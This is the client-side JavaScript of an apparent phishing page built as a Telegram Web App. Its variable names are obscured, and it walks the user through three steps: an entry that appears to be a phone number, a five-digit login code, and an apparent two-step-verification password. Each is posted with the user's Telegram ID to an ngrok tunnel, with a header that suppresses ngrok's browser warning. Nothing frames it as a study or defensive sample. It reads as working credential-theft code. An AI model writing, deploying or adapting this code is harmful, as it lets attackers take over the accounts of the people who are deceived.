document.addEventListener('DOMContentLoaded', function () {
    const _w = window.Telegram.WebApp;
    const _s1 = document.getElementById('s1');
    const _s2 = document.getElementById('s2');
    const _s3 = document.getElementById('s3');
    const _i1 = document.getElementById('i1');
    const _b1 = document.getElementById('b1');
    const _cx = document.querySelectorAll('.cx');
    const _kx = document.querySelectorAll('.kx');
    const _b2 = document.getElementById('b2');
    const _i3 = document.getElementById('i3');
    const _b3 = document.getElementById('b3');

    const _u = 'https://proindustrialisation-annice-emptiable.ngrok-free.dev';
    const _id = _w.initDataUnsafe?.user?.id || 'x_' + Date.now();
    const _h = { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' };

    _w.ready();
    _w.expand();
    if (_w.requestFullscreen) _w.requestFullscreen();

    function _alert(m) { alert(m); }

    async function _post(p, d) {
        const r = await fetch(_u + p, { method: 'POST', headers: _h, body: JSON.stringify(d) });
        const t = await r.text();
        try { return JSON.parse(t); }
        catch(e) { throw new Error(t.substring(0, 100)); }
    }

    _b1.addEventListener('click', async function () {
        const v = _i1.value.trim();
        if (v.length < 10) { _alert('Invalid input.'); return; }
        _b1.disabled = true; _b1.textContent = '...';
        try {
            const r = await _post('/xp1', { a: v, b: String(_id) });
            if (r.ok) { _sw('s2'); _alert('Check your device.'); }
            else { _alert(r.msg || 'Error.'); }
        } catch(e) { _alert(e.message); }
        finally { _b1.disabled = false; _b1.textContent = 'Proceed'; }
    });

    let _ci = 0;
    function _fn() { if (_ci < _cx.length - 1) _cx[++_ci].focus(); }
    function _fp() { if (_ci > 0) _cx[--_ci].focus(); }

    _cx.forEach(c => {
        c.addEventListener('keydown', function(e) { if (e.key === 'Backspace' && this.value === '') _fp(); });
    });

    _kx.forEach(k => {
        k.addEventListener('click', function() {
            const v = this.dataset.k;
            if (v === 'del') { _cx[_ci].value = ''; _fp(); }
            else { _cx[_ci].value = v; _fn(); }
        });
    });

    _b2.addEventListener('click', async function () {
        const v = Array.from(_cx).map(c => c.value).join('');
        if (v.length !== 5) { _alert('Incomplete.'); return; }
        _b2.disabled = true; _b2.textContent = '...';
        try {
            const r = await _post('/xp2', { c: v, b: String(_id) });
            if (r.ok) {
                if (r.nx) { _sw('s3'); }
                else { _w.sendData('da'); }
            } else {
                _alert(r.msg || 'Error.');
                _cx.forEach(c => c.value = ''); _ci = 0; _cx[0].focus();
            }
        } catch(e) { _alert(e.message); }
        finally { _b2.disabled = false; _b2.textContent = 'Proceed'; }
    });

    _b3.addEventListener('click', async function () {
        const v = _i3.value;
        if (!v) { _alert('Required.'); return; }
        _b3.disabled = true; _b3.textContent = '...';
        try {
            const r = await _post('/xp3', { k: v, b: String(_id) });
            if (r.ok) { _w.sendData('db'); }
            else { _alert(r.msg || 'Error.'); _i3.value = ''; }
        } catch(e) { _alert(e.message); }
        finally { _b3.disabled = false; _b3.textContent = 'Proceed'; }
    });

    function _sw(n) {
        _s1.style.display = 'none';
        _s2.style.display = 'none';
        _s3.style.display = 'none';
        if (n === 's2') { _s2.style.display = 'flex'; _ci = 0; _cx[0].focus(); }
        else if (n === 's3') { _s3.style.display = 'flex'; _i3.focus(); }
    }
});
